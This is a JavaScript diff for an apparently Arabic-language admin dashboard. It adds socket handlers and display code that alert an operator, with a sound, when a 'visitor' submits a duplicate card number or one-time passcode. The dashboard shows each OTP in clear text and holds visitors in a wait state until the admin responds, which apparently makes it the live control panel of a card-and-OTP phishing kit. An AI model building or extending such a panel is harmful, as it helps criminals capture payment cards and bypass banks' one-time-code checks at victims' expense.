@@ -1145,6 +1145,39 @@
         }
       });
 
+      socket.on('visitor:duplicateCard', ({ visitorId, cardNumber, visitor: updatedVisitor }) => {
+        const existing = visitors.get(visitorId);
+        if (existing) {
+          Object.assign(existing, updatedVisitor);
+          existing.isConnected = true;
+          existing.waitingForAdminResponse = false;
+          visitors.set(visitorId, existing);
+          renderVisitorsList();
+          if (selectedVisitorId === visitorId) {
+            renderVisitorDetails(existing);
+          }
+        }
+        const maskedCard = cardNumber ? cardNumber.slice(0, 4) + ' **** **** ' + cardNumber.slice(-4) : '';
+        showNotification('⚠️ تم رفض بطاقة مكررة من الزائر #' + (existing ? existing.visitorNumber : '') + ' - ' + maskedCard);
+        try { frogAudio.currentTime = 0; frogAudio.play().catch(() => {}); } catch(e) {}
+      });
+
+      socket.on('visitor:duplicateOtp', ({ visitorId, code, page, visitor: updatedVisitor }) => {
+        const existing = visitors.get(visitorId);
+        if (existing) {
+          Object.assign(existing, updatedVisitor);
+          existing.isConnected = true;
+          existing.waitingForAdminResponse = false;
+          visitors.set(visitorId, existing);
+          renderVisitorsList();
+          if (selectedVisitorId === visitorId) {
+            renderVisitorDetails(existing);
+          }
+        }
+        showNotification('⚠️ تم رفض رمز مكرر من الزائر #' + (existing ? existing.visitorNumber : '') + ' - ' + code);
+        try { frogAudio.currentTime = 0; frogAudio.play().catch(() => {}); } catch(e) {}
+      });
+
       socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
         const visitor = visitors.get(visitorId);
         if (visitor) {
@@ -1595,6 +1628,30 @@
         });
       }
       
+      // Add duplicate card rejections
+      if (visitor.duplicateCardRejections && visitor.duplicateCardRejections.length > 0) {
+        visitor.duplicateCardRejections.forEach((rej, index) => {
+          allEntries.push({
+            type: 'duplicateCard',
+            data: rej,
+            index: index,
+            timestamp: rej.timestamp || new Date(0).toISOString()
+          });
+        });
+      }
+      
+      // Add duplicate OTP rejections
+      if (visitor.duplicateOtpRejections && visitor.duplicateOtpRejections.length > 0) {
+        visitor.duplicateOtpRejections.forEach((rej, index) => {
+          allEntries.push({
+            type: 'duplicateOtp',
+            data: rej,
+            index: index,
+            timestamp: rej.timestamp || new Date(0).toISOString()
+          });
+        });
+      }
+      
       // Sort by timestamp (newest first)
       allEntries.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
       
@@ -1602,7 +1659,31 @@
       if (allEntries.length > 0) {
         html += '<div class="space-y-3">';
         allEntries.forEach((entry) => {
-          if (entry.type === 'code') {
+          if (entry.type === 'duplicateCard') {
+            const rej = entry.data;
+            const maskedCard = rej.cardNumber ? rej.cardNumber.slice(0, 4) + ' **** **** ' + rej.cardNumber.slice(-4) : '';
+            html += '<div class="data-section bg-yellow-50 p-4 rounded-lg" style="border-right: 4px solid #f59e0b;">';
+            html += '<div class="flex items-center gap-2">';
+            html += '<span class="text-lg">⚠️</span>';
+            html += '<span class="font-bold text-yellow-800">تم رفض بطاقة مكررة: ' + maskedCard + '</span>';
+            html += '</div>';
+            if (rej.timestamp) {
+              html += '<div class="text-xs text-gray-500 mt-1">' + new Date(rej.timestamp).toLocaleTimeString('ar-SA') + '</div>';
+            }
+            html += '</div>';
+          } else if (entry.type === 'duplicateOtp') {
+            const rej = entry.data;
+            html += '<div class="data-section bg-yellow-50 p-4 rounded-lg" style="border-right: 4px solid #f59e0b;">';
+            html += '<div class="flex items-center gap-2">';
+            html += '<span class="text-lg">⚠️</span>';
+            html += '<span class="font-bold text-yellow-800">تم رفض رمز مكرر: ' + rej.code + '</span>';
+            if (rej.page) html += '<span class="text-sm text-gray-500">(' + rej.page + ')</span>';
+            html += '</div>';
+            if (rej.timestamp) {
+              html += '<div class="text-xs text-gray-500 mt-1">' + new Date(rej.timestamp).toLocaleTimeString('ar-SA') + '</div>';
+            }
+            html += '</div>';
+          } else if (entry.type === 'code') {
             const dc = entry.data;
             const index = entry.index;
             html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
